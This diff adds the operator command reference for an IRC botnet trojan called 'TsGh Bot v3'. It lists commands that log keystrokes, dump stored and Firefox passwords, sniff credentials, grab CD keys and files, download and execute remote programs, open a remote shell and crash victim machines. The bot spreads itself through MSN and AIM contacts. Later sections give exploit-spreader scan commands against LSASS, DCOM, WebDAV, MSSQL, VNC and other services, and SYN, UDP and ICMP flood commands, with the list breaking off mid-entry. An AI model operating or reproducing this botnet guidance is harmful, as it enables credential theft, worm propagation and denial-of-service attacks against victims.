@@ -1,0 +1,163 @@
+TsGh Bot v3 By TsGh Sniper
+
+.login                         * login password
+.logout                        * logout
+.who                           * who
+.getclip                       * get clip board data
+.currentip                     * current ip scanning
+.rloginserver                  * rlogin server (login with putty)
+.get                           * get filename.zip 
+.redirect                      * redirect
+.update                        * update Http://Www.Website.Com/File.exe BotID.
+.download                      * download http://Website.Com/File.exe C:\File.exe 1 ( 1 = execute : 0 = don`t execute )
+.execute                       * execute C:\file.exe
+.findfile                      * findfile file.exe C:\
+.findfilestop                  * findfilestop
+.rename                        * rename botfilename.exe botfilename2.exe
+.mode                          * mode +i-x
+.version                       * version
+.gethost                       * get host info
+.delay                         * delays action
+.secure                        * secures bot
+.securestop                    * stopsecure
+.unsecure                      * unsecures bot
+.ident on                      * enable ident server
+.ident off                     * disable ident server
+.keylog on                     * enable key loger
+.keylog off                    * disable key loger
+.join                          * join #Channel
+.part                          * part #Channel
+.netinfo                       * netinfo
+.sysinfo                       * sysinfo
+.raw                           * raw #Channel +o Himmler
+.prefix                        * prefix $ (change prefix to...)
+.open                          * open File
+.server                        * server Irc.AnotherServer.Net
+.dns                           * dns host.name.net
+.addalias                      * addalias  " untested " 
+.privmsg                       * privmsg #Channel Hello   / Nickname Fuck u
+.action                        * perform action
+.cycle                         * cycle (do something repetitive) eg .cycle 5 join #lolol
+.die                           * kill ur bot.exe " is will be back after the next restart
+.email                         * email mx3.hotmail.com From@Hotmail.Com To@yaoo.Com Subject Msg
+.httpcon                       * httpcon
+.upload                        * upload
+.reconnect                     * reconnect
+.disconnect                    * disconnect
+.status                        * status
+.mirccmd                       * mirccmd
+.cmd                           * remote cmd (.opencmd to activate)
+.system reboot                 * restart bot victim machine
+.system shutdown               * shutdown bot victim machine
+.system logoff                 * logoff bot victim machine
+.threads                       * list threads
+.killthread all                * kill all threads
+.getcdkeys                     * get cdkeys for windows / games
+.driveinfo                     * get drivers info
+.opencmd                       * opencmd 
+.cmdstop                       * stopcmd
+.httpserver                    * httpserver C:\ or D:\
+.httpstop                      * stop http server
+.tftpserver                    * start tftp
+.tftpstop                      * stop tftp
+.crash                         * crash bot victim machine ( destroy all system )
+.findpass                      * get bot victim passwords
+.nick                          * change bot nick
+.log                           * list bot log
+.clearlog                      * clear log list
+.procs                         * list all files running in bot victim P.c
+.procsstop                     * procsstop File.exe
+.killproc                      * killprocs File.exe
+.delete                        * delete C:\File.exe
+.list                          * list *.exe or *.zip or *.rar any extensions u want list from bot victim P.c
+.visit                         * visit http://www.website.com  ( hiden )
+.readfile                      * readfile C:\file.txt
+.psniff on                     * pass sniff on
+.psniff off                    * pass sniff off
+.remove                        * remove bot completly from vistim pc
+.msn			       * sends the bot to every contact on the victims pc using msn messenger
+.aim			       * sends the bot to every contact on the victims pc using aim
+.pstore                        * dumps all of the victims passwords into the mirc channel
+.firefox                       * dumps all of their stored firefox passwords
+
+
+psniff can steal any information about
+(Bots Net)  (Ftp) (Php) (Http)  (Mirc) (Users) (Accounts) (Admins) (Opers )
+
+.net start
+.net stop
+.net pause
+.net continue
+.net delete
+.net share
+.net user
+.net send
+.capture video
+.capture screen
+.capture drivers
+.capture frame
+.clone irc.server.net:6667 #Channel
+.c_join
+.c_part
+.C_raw
+.c_mode
+.c_nick
+.c_privmsg
+.c_notice
+.c_rndnick
+.clonestop
+.c_quit
+
+-=-=-=-=-=-=-=-=-=-=-=-
+;   Using Exploits    ;
+-=-=-=-=-=-=-=-=-=-=-=-
+ri0t r00t b0t comes with many exploits listed below is how to use them:
+
+-r = random range scanner from the " Bot Ip " Ex: " the bot connect from ip ( 62.150.15.15 ) 
+the -r scanning from 62.150.0.0 to 62.150.255.255 but in random method
+
+-b = same -r but in Sequential method from 62.150.0.0 to 62.150.255.255
+-a = long range scanner from first range of bot ip Ex: 62.0.0.0 to 62.255.255.255
+-s = silent u can used with all Bot Commands, no reply msg from the bots
+x = ip range ex: 0 to 255
+u can scan fot ip range u choiced Ex: advscan lsass 100 5 999 62.150.x.x -r
+100 = scanner threads
+5 = delay in sec
+999 = time of scanner
+
+.advscan lsass 100 5 999 -r               * Lsass Exploit Spreader Using Port 445
+.advscan iis5ssl 100 5 999 -b             * IIS 5 SSL Exploit Spreader Using Port 443
+.advscan dcom135 100 5 999 -a             * Dcom Exploit Spreader Using Port 135
+.advscan dcom445 100 5 999 -r -s          * Dcom Exploit Spreader Using Port 445
+.advscan dcom1025 100 5 999 -b -s         * Dcom Exploit Spreader Using Port 1025 ( is shit )
+.advscan dcom2-135 100 5 999 -a -s        * Dcom2 Exploit Spreader Using Port 135
+.advscan dcom2-445 100 5 999 -r           * Dcom2 Exploit Spreader Using Port 445
+.advscan beagle1 100 5 999 -r             * Bagle Exploit Spreader Using Port 2745
+.advscan beagle2 100 5 999 -r             * Bagle2 Exploit Spreader Using Port 2745
+.advscan webdav 100 5 999 -r              * WebDav Exploit Spreader Using Port 80
+.advscan wkssvc 100 5 999 -r              * Wks Exploit Spreader Using Port 135
+.advscan wkssvc2 100 5 999 -r             * Wks Exploit Spreader Using Port 445
+.advscan dameware 100 5 999 -r            * DameWare Exploit Spreader Using Port 6129
+.advscan upnp 100 5 999 -r                * UPNP Exploit Spreader Using Port 5000
+.advscan mydoom 100 5 999 -r              * MyDoom Exploit Spreader Using Port 3127
+.advscan netbios 100 5 999 -r             * NetBios Exploit Spreader Using Port 139
+.advscan ntpass 100 5 999 -r              * NB+NP Exploit Spreader Using Port 445
+.advscan mssql 100 5 999 -r               * MSSQL Exploit Spreader Using Port 1433
+.advscan vnc 100 5 999 -r                 * VNC Exploit spreader Using Port 5900
+.advscan optix 100 5 999 -r               * Optix Trojan Spreader Using Port 3410
+.advscan sub7 100 5 999 -r                * Sub7 Trojan Spreader Using Port 27374
+.advscan netdevil 100 5 999 -r            * NetDevil Trojan Spreader Using Port 901
+.advscan netdevil2 100 5 999 -r           * NetDevil Trojan Spreader Using Port 903
+.scanstats                                * Get Scan Stats
+.scanstop                                 * Stop Scanning
+
+-=-=-=-=-=-=-=-=-=-=-=-=-
+; Flooders              ;
+-=-=-=-=-=-=-=-=-=-=-=-=-
+
+.icmpflood                                * icmpflood 62.150.15.15 99999
+.synflood                                 * synflood 62.150.15.15 1000 2000
+.udpflood                                 * udpflood Ip Number Size Delay
+.pingflood                                * pingflood Ip Number Size Delay
+.tcpflood                                 * Ip Port r
+.supersyn
